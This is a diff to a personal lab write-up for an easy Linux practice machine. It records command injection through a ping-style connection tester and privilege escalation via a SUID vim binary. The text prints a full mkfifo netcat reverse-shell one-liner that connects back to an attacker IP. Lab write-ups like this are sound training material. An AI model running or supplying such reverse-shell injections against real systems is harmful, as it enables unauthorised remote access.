@@ -3,7 +3,7 @@ Alias: Shakabra
 Date: 5/4/22
 Platform: Linux
 Difficulty: Easy
-Tags:
+Tags: #ConnectionTesterTool #Command_Injection #mkfifoNetcatReverseShell #SUIDvim.basicPrivilegeEscalation
 Status: Finished
 IP: 192.168.127.86
 ---
@@ -15,7 +15,8 @@ IP: 192.168.127.86
 - Found a connection tester tool running on port 80
 - Added a semi colon and modified mkfifo netcat one liner; setup a netcat listener and recieved a reverse shell
 - Found SUID /usr/bin/vim.basic binary on the target machine
-- Foun
+- Found the SUID binary on GTFO bins 
+- Followed the steps to escalate privileges and received a root shell
 
 ## Improved skills
 - Found adding a semi colon after a command will be treated a separate command the commands will be executed sequentially 
@@ -138,7 +139,7 @@ Enumerated top 200 UDP ports:
 #### As port 80 was found to be open per nmap scan; I navigated to the boxes IP address and found the below webpage: 
 
 ![](Pasted%20image%2020221018181215.png)
-
+#ConnectionTesterTool
 #### As "127.0.0.1 was already populated in the "ping" bar I input "127.0.0.1" into it and clicked go and found the below ping results: 
 
 ![](Pasted%20image%2020221018181341.png)
@@ -161,6 +162,7 @@ Enumerated top 200 UDP ports:
 ## Command injection from connection tester tool
 
 #### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
+#mkfifoNetcatReverseShell
 
 #### Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell 
 
@@ -185,6 +187,6 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221018184146.png)
 
 ![](Pasted%20image%2020221018184222.png)
-#VIMsuidBinary
+#SUIDvim.basicPrivilegeEscalation
 ---
 
